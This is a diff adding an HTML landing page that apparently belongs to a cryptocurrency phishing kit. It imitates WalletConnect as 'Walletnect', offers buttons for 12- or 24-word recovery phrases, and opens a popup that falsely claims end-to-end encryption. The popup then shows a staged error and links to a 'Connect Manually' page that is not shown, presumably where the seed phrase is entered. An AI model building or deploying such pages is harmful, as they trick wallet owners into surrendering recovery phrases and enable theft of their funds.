@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>wallect-connect</title>
+    <link rel="stylesheet" href="pop.css">
+ <div class="sticky"> Walletnect </div>
+</head>
+
+<body>
+    
+  <h1>Conect to server</h1>
+
+    <div class="container">
+   
+        <div class="btn">
+         <button type="submit" class="btn1" onclick="openpopup()">
+            12 phrases words
+            </button>
+      
+            <button type="submit" class="btn2" onclick="openpopup()">
+                24 phrases words
+             </button>
+        </div>
+
+      <div class="popup" id="popup">
+        <img src="image/wwww.png">
+         <p class="rect1">This session is secured and encrypted</p>
+
+         <P class="rect2"> An error occured... please try again or connect manually</P>
+         <div class="rect3">Try Again</div>
+ <a href="connect.html"><button type="button"  onclick="closepopup()">Connect Manually</button></a>
+           <p class="rect5">This session is protected with an end-to-end encryption</p>
+        </div>
+    </div>
+    
+    <script>
+        let popup =document.getElementById("popup");
+        function openpopup(){
+         popup.classList.add("open-popup");   
+        }
+
+        function closepopup(){
+         popup.classList.remove("open-popup");   
+        }
+    </script>
+ 
+ <img src="image/wwww.png" id="img4">
+
+ <footer>
+    <div class="footer">
+        <h2 class="dec">Decentralized
+            <br>
+            Launchpad
+         </h2>
+         <p class="dec2">Open and decentralized protocol for syncing various<br>
+             Wallets to Dapps Secure Server. This is not an app but a 
+            <br>protocol that estabishs a remote connection between two apps and/or devices</p>
+     </div>
+
+
+      <div class="dec3">
+        <h3>subsribe</h3>
+        <input type="text" placeholder="email">
+       
+      </div> 
+       <button id="button" type="submit">subcribe</button>
+    </footer>
+
+</body>
+</html>
